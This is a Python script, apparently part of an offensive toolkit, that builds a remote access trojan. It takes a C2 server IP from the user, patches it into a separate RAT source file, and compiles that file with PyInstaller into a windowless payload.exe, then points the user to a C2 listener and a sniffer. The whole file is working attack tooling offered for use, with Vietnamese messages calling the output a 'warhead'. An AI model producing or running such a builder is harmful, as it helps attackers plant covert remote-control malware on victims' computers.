import os
import sys
import subprocess
import shutil
import socket

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

print(r"""
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌     ▐░▌     
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀      ▐░▌     
▐░▌          ▐░▌     ▐░▌       ▐░▌     
▐░▌          ▐░▌      ▐░▌      ▐░▌     
▐░▌          ▐░▌       ▐░▌     ▐░▌     
 ▀            ▀         ▀       ▀      
[*] RAT PAYLOAD BUILDER - BY ENI
""")

current_ip = get_local_ip()
print(f"[*] IP hiện tại của anh (Tự động phát hiện): {current_ip}")
hacker_ip = input(f"[?] Nhập IP cho C2 (Ấn Enter để dùng {current_ip}): ").strip()
if not hacker_ip:
    hacker_ip = current_ip

rat_file = os.path.join("attacks", "rat_payload.py")
if not os.path.exists(rat_file):
    print(f"[-] Không tìm thấy file {rat_file}!")
    sys.exit(1)

print(f"\n[*] Đang tiêm IP {hacker_ip} vào mã nguồn RAT...")
# Đọc code RAT
with open(rat_file, "r", encoding="utf-8") as f:
    lines = f.readlines()

# Thay thế HACKER_IP
with open(rat_file, "w", encoding="utf-8") as f:
    for line in lines:
        if line.startswith("HACKER_IP = "):
            f.write(f'HACKER_IP = "{hacker_ip}" # Đã chèn tự động bởi builder\n')
        else:
            f.write(line)

print("[*] Đang khởi động Lò Đúc đạn (PyInstaller)...")
# Build với PyInstaller
try:
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "attacks/rat_payload.py"], check=True)
except subprocess.CalledProcessError:
    print("[-] Lỗi khi build! Đảm bảo anh đã cài pyinstaller (pip install pyinstaller).")
    sys.exit(1)

# Dọn dẹp và copy file
print("\n[*] Đang trích xuất đầu đạn...")
dist_exe = os.path.join("dist", "rat_payload.exe")
target_exe = "payload.exe"

if os.path.exists(dist_exe):
    if os.path.exists(target_exe):
        os.remove(target_exe)
    shutil.copy2(dist_exe, target_exe)
    print(f"[+] THÀNH CÔNG! Đã đóng gói xong RAT vào file: {target_exe}")
    print("[+] Anh có thể chạy C2 Listener (python attacks/c2_listener.py) và bóp cò Sniffer ngay!")
else:
    print("[-] Không tìm thấy file exe sau khi build. Có lỗi xảy ra.")
